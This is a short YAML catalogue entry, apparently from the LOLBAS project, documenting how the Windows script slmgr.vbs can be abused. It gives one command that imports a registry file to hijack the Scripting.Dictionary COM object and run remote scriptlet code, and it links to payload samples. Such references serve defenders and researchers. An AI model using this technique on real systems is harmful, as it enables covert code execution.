---
functions:
  execute:
    -
      Name: Slmgr.vbs
      Description: Execute
      Author: ''
      Created: '2018-05-25'
      Categories: |
      
      Commands: |
          Command: reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs
          Description: Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code.
      Full_Path:
          c:\windows\system32\slmgr.vbs
          c:\windows\sysWOW64\slmgr.vbs
      Code_Sample:
          https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSScripts/Payload/Slmgr.reg
          https://github.com/LOLBAS-Project/LOLBAS/blob/master/OSScripts/Payload/Slmgr_calc.sct
      Detection: |
          
      Resources: |
          https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
          https://www.youtube.com/watch?v=3gz1QmiMhss
      Notes: Thanks to Matt Nelson - @enigma0x3, Casey Smith - @subTee
---